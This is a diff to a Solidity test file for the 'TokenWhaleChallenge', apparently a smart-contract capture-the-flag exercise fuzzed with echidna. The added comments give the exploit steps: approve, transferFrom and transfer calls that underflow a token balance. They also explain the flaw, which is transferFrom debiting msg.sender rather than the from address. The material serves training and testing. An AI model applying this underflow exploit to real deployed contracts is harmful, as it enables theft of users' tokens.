@@ -17,3 +17,16 @@ contract TokenWhaleChallengeTest is TokenWhaleChallenge {
         return !isComplete();
     }
 }
+
+// Solution (from echidna + interpretation)
+
+// 0x10000 = A
+// 0x30000 = B
+// B has starting balance of 1000 tokens
+
+// B calls approve(A, large_number);
+// A calls transferFrom(B, B, 697); // this should underflow the balance of A
+// A calls transfer(A, 99999); // A now has infinite tokens to send to B
+
+// explanation: transferFrom() sends tokens from msg.sender instead of the from address.
+// OZ ERC20 does ```_transfer(from, to, value);```
